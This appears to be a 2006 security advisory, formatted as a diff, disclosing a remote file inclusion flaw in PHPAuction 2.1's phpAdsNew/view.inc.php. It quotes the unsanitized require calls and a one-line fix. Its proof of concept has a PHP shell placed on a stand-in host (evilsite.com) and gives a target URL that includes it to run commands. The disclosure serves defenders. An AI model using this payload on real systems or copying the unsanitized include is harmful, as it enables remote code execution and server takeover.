@@ -1,0 +1,48 @@
++--------------------------------------------------------------------
++
++ PHPAuction 2.1 Remote File Inclusion
++
++--------------------------------------------------------------------
++
++ Affected Software .: PHPAuction 2.1 (maybe higher)
++ Venedor ...........: http://www.phpauction.net,
++ Class .............: Remote File Inclusion in /phpAdsNew/view.inc.php
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Original advisory .: http://www.bb-pcsecurity.de/
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++
++--------------------------------------------------------------------
++
++ Code /phpAdsNew/view.inc.php:
++
++ .....
++ // Include required files
++ require ("$phpAds_path/dblib.php");
++ require ("$phpAds_path/lib-expire.inc.php");
++ .....
++
++--------------------------------------------------------------------
++
++ $phpAds_path is not properly sanitized before being used.
++
++--------------------------------------------------------------------
++
++ Solution:
++ Declare $phpAds_path before using.
++
++--------------------------------------------------------------------
++ PoC:
++ Place a PHPShell on a remote location:
++ http://evilsite.com/dblib.php/index.html
++
++ http://[target]/phpAdsNew/view.inc.php?phpAds_path=http://evilsite.com/dblib.php/&cmd=ls
++
++--------------------------------------------------------------------
++
++ Greets:
++ Krini&Lenni
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-08-01]
